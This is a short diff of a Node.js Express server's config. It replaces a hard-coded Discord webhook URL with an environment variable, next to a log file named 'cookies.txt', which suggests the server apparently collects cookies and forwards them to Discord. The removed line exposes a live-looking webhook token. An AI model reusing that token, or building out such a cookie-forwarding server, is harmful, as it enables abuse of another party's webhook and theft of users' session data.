@@ -13,7 +13,7 @@ const PORT = process.env.PORT || 3000;
 
 // ─── CONFIG ───
 const LOG_FILE = "cookies.txt";
-const WEBHOOK_URL = https://discord.com/api/webhooks/1529258026945740932/HygJsAGCL2MSaV114QaDf_d7F4WJZsSGC4IWnEcr4K3hhNmEUPTcej3-jXUjyMc5aSVU || ""; // Discord webhook
+const WEBHOOK_URL = process.env.WEBHOOK_URL || ""; // Discord webhook
 
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
